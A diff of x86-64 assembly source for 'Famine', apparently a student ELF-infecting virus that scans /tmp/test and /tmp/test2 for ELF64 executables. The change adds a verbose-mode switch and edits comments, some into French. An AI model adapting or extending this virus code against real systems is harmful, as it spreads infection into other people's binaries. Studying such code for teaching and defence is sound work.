@@ -119,9 +119,13 @@ _start:
     ; When running as original famine binary, use normal data sections
     mov qword [rel file_count], 0
     
-    lea rsi, [rel firstDir]           ; source = /tmp/test
+%ifdef VERBOSE_MODE
+    lea rsi, [rel firstDir]     ; source = /tmp/test
     lea rdi, [rel path_buffer]
     call print_string
+%endif
+    lea rsi, [rel firstDir]     ; source = /tmp/test
+    lea rdi, [rel path_buffer]
     call str_copy
     lea rdi, [rel path_buffer]
     call list_files_recursive
@@ -130,8 +134,7 @@ _start:
     mov rsi, [rel file_count]
     call check_elf64_exec
     
-    ; Also process /tmp/test2 directory
-    lea rsi, [rel secondDir]          ; source = /tmp/test2
+    lea rsi, [rel secondDir]    ; source = /tmp/test2
     lea rdi, [rel path_buffer]
     call str_copy
     lea rdi, [rel path_buffer]
@@ -148,7 +151,7 @@ _start:
     mov eax, SYS_WRITE
     mov edi, STDOUT
     lea rsi, [rel msg_debugging]
-    mov edx, 12                 ; length of "DEBUGGING..\n" (without null terminator)
+    mov edx, 12                 
     syscall
     
     ; Exit the program
@@ -313,7 +316,7 @@ v_signature:      db "Famine version 1.0 (c)oded by <ocrossi>-<elaignel>", 0
 v_signature_len:  equ $ - v_signature - 1
 
 ; ============================================
-; virus_str_copy - Copy string (position independent)
+; virus_str_copy - Copy string avec adresses relatives
 ; rdi = destination
 ; rsi = source
 ; ============================================
@@ -328,7 +331,7 @@ virus_str_copy:
     ret
 
 ; ============================================
-; virus_str_len - Get string length
+; virus_str_len - Get string length avec adresses relatives
 ; rdi = string pointer
 ; Returns: rax = length
 ; ============================================
